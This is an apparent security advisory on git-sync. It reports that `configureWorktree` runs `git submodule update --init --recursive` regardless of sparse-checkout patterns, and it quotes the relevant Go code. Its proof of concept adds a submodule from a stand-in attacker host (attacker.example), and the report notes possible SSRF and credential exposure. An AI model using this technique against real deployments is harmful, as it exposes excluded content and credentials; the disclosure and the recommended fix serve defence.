### Title
Sparse-checkout content restriction is bypassed by unconditional `submodule update --init --recursive` - (File: main.go, function `configureWorktree`)

### Summary
`git-sync` lets an operator restrict which files from an untrusted, attacker-pushed upstream repository are ever materialized into the published `--link` directory by supplying `--sparse-checkout-file`. That restriction is enforced only for the top-level worktree checkout. When the synced repo also contains git submodules (the default `--submodules=recursive` mode), `configureWorktree()` unconditionally runs `git submodule update --init --recursive` after the sparse-checkout reset, with no awareness of the sparse-checkout patterns. An attacker who controls the remote repository content (the git-sync threat model explicitly includes "untrusted repo content") can add a `.gitmodules` entry pointing a submodule at a path that the operator's sparse-checkout file was configured to exclude, and that submodule's full contents will still be fetched and published under `--link`, defeating the operator's content restriction.

### Finding Description
`configureWorktree()` in `main.go` performs, in order: [1](#0-0) 
1. Writes/removes the `sparse-checkout` config file based on `--sparse-checkout-file` and runs `sparse-checkout init`.
2. Runs `git reset --hard <hash> --` to materialize only the sparse-checkout-selected paths: [2](#0-1) 
3. Unconditionally updates submodules regardless of whether the submodule's working-tree path is inside or outside the sparse-checkout selection: [3](#0-2) 

There is no code path that intersects the sparse-checkout pattern set with submodule paths before running `submodule update --init --recursive`. The `--submodules` flag only controls recursion depth/shallow-vs-full behavior, not whether a given submodule path is in scope of `--sparse-checkout-file`: [4](#0-3) 

Because `--repo` content is, by design, untrusted/attacker-controllable (that is the entire point of syncing a remote git repository), an attacker who can push a commit to the tracked ref can add a `.gitmodules` entry with a `path` matching an excluded sparse-checkout directory and a `url` pointing anywhere reachable from the git-sync pod. On the next sync, `git submodule update --init --recursive` will clone that submodule and materialize its files at the excluded path, and `publishSymlink()` will atomically expose this content to consumers as if it were part of the sanctioned, restricted checkout: [5](#0-4) 

### Impact Explanation
- **Publishing wrong/unrestricted content**: The operator's declared content restriction (`--sparse-checkout-file`, used to exclude specific paths/directories from ever being synced/exposed to the consuming application) is silently bypassed. Consumer applications reading from `--link` (e.g., a webserver sidecar) can be served files the operator explicitly intended to exclude.
- **SSRF / unexpected outbound network calls / potential credential exposure**: Since submodule fetching is not restricted to same-host/known remotes, an attacker-controlled `.gitmodules` `url` field is used directly to run `git fetch`, meaning the git-sync pod's network egress and possibly configured credentials (`--credential`, cookies, SSH keys) can be directed at attacker-chosen endpoints, depending on git's credential-matching rules.
- This satisfies the "publishing wrong or partial content" and, depending on network configuration, "credential or token disclosure" acceptance criteria.

### Likelihood Explanation
Likelihood is high in any deployment that combines `--sparse-checkout-file` with default/recursive submodules against an untrusted or multi-tenant upstream repository (a documented, supported git-sync configuration). No special flags beyond the commonly-used `--sparse-checkout-file` are required beyond the default `--submodules=recursive`. The attacker only needs push/merge access to the tracked ref/branch of the source repo (the standard "attacker-pushed commit" threat model for this class of report), and does not require any git-sync operator misconfiguration beyond using sparse-checkout as a content-scoping mechanism, which is its documented purpose.

### Recommendation
Before running `git submodule update --init --recursive`, filter the set of submodules against the active sparse-checkout patterns (e.g., use `git config -f .gitmodules --get-regexp path` combined with `git check-ignore`/sparse-checkout pattern matching, or use `git -c submodule.active=<pattern> submodule update`) and skip/deinit submodules whose paths fall outside the sparse-checkout selection. Alternatively, document and enforce that `--sparse-checkout-file` and `--submodules` (other than `off`) are mutually exclusive unless the operator explicitly opts into unrestricted submodule fetching, and fail fast with a clear error if both are combined.

### Proof of Concept
1. Operator runs:
   ```
   git-sync --repo=<attacker-writable-repo> --root=$ROOT --link=link \
     --sparse-checkout-file=/config/sparse (excluding path "secret/") \
     --submodules=recursive
   ```
2. Attacker (who can push to the tracked ref) adds:
   ```
   git submodule add https://attacker.example/payload.git secret/payload
   git commit -am "add submodule"
   ```
3. On next sync, `configureWorktree()` runs `sparse-checkout init` + `reset --hard` (excluding `secret/`), then unconditionally runs `submodule update --init --recursive`, which clones `https://attacker.example/payload.git` into `$ROOT/.worktrees/<hash>/secret/payload`.
4. `publishSymlink()` atomically flips `$ROOT/link` to that worktree, so `$ROOT/link/secret/payload/*` becomes visible to the consuming application/pod despite the sparse-checkout rule explicitly excluding `secret/`. [6](#0-5)

// publishSymlink atomically sets link to point at the specified target.  If the
// link existed, this returns the previous target.
func (git *repoSync) publishSymlink(worktree worktree) error {
	targetPath := worktree.Path()
	linkDir, linkFile := git.link.Split()

	// Make sure the link directory exists.
	if err := os.MkdirAll(linkDir.String(), defaultDirMode); err != nil {
		return fmt.Errorf("error making symlink dir: %w", err)
	}

	// linkDir is absolute, so we need to change it to a relative path.  This is
	// so it can be volume-mounted at another path and the symlink still works.
	targetRelative, err := filepath.Rel(linkDir.String(), targetPath.String())
	if err != nil {
		return fmt.Errorf("error converting to relative path: %w", err)
	}

	const tmplink = "tmp-link"
	git.log.V(2).Info("creating tmp symlink", "dir", linkDir, "link", tmplink, "target", targetRelative)
	if err := os.Symlink(targetRelative, filepath.Join(linkDir.String(), tmplink)); err != nil {
		return fmt.Errorf("error creating symlink: %w", err)
	}

	git.log.V(2).Info("renaming symlink", "root", linkDir, "oldName", tmplink, "newName", linkFile)
	if err := os.Rename(filepath.Join(linkDir.String(), tmplink), git.link.String()); err != nil {
		return fmt.Errorf("error replacing symlink: %w", err)
	}

	return nil
}

// configureWorktree applies some configuration (e.g. sparse checkout) to
// the specified worktree and checks out the specified hash and submodules.
func (git *repoSync) configureWorktree(ctx context.Context, worktree worktree) error {
	hash := worktree.Hash()

	// The .git file in the worktree directory holds a reference to
	// /git/.git/worktrees/<worktree-dir-name>. Replace it with a reference
	// using relative paths, so that other containers can use a different volume
	// mount name.
	var rootDotGit string
	if rel, err := filepath.Rel(worktree.Path().String(), git.root.String()); err != nil {
		return err
	} else {
		rootDotGit = filepath.Join(rel, ".git")
	}
	gitDirRef := []byte("gitdir: " + filepath.Join(rootDotGit, "worktrees", hash) + "\n")
	if err := os.WriteFile(worktree.Path().Join(".git").String(), gitDirRef, 0644); err != nil {
		return err
	}

	// If sparse checkout is requested, configure git for it, otherwise
	// unconfigure it.
	gitInfoPath := filepath.Join(git.root.String(), ".git/worktrees", hash, "info")
	gitSparseConfigPath := filepath.Join(gitInfoPath, "sparse-checkout")
	if git.sparseFile == "" {
		os.RemoveAll(gitSparseConfigPath)
	} else {
		// This is required due to the undocumented behavior outlined here:
		// https://public-inbox.org/git/CAPig+cSP0UiEBXSCi7Ua099eOdpMk8R=JtAjPuUavRF4z0R0Vg@mail.gmail.com/t/
		git.log.V(1).Info("configuring worktree sparse checkout")
		checkoutFile := git.sparseFile

		source, err := os.Open(checkoutFile)
		if err != nil {
			return err
		}
		defer source.Close()

		if _, err := os.Stat(gitInfoPath); os.IsNotExist(err) {
			err := os.Mkdir(gitInfoPath, defaultDirMode)
			if err != nil {
				return err
			}
		}

		destination, err := os.Create(gitSparseConfigPath)
		if err != nil {
			return err
		}
		defer destination.Close()

		_, err = io.Copy(destination, source)
		if err != nil {
			return err
		}

		args := []string{"sparse-checkout", "init"}
		if _, _, err = git.Run(ctx, worktree.Path(), args...); err != nil {
			return err
		}
	}

	// Reset the worktree's working copy to the specific ref.
	git.log.V(1).Info("setting worktree HEAD", "hash", hash)
	if _, _, err := git.Run(ctx, worktree.Path(), "reset", "--hard", hash, "--"); err != nil {
		return err
	}

	// Update submodules
	// NOTE: this works for repo with or without submodules.
	if git.submodules != submodulesOff {
		git.log.V(1).Info("updating submodules")
		submodulesArgs := []string{"submodule", "update", "--init"}
		if git.submodules == submodulesRecursive {
			submodulesArgs = append(submodulesArgs, "--recursive")
		}
		if git.depth != 0 {
			submodulesArgs = append(submodulesArgs, "--depth", strconv.Itoa(git.depth))
		}
		if _, _, err := git.Run(ctx, worktree.Path(), submodulesArgs...); err != nil {
			return err
		}
	}

	return nil
}
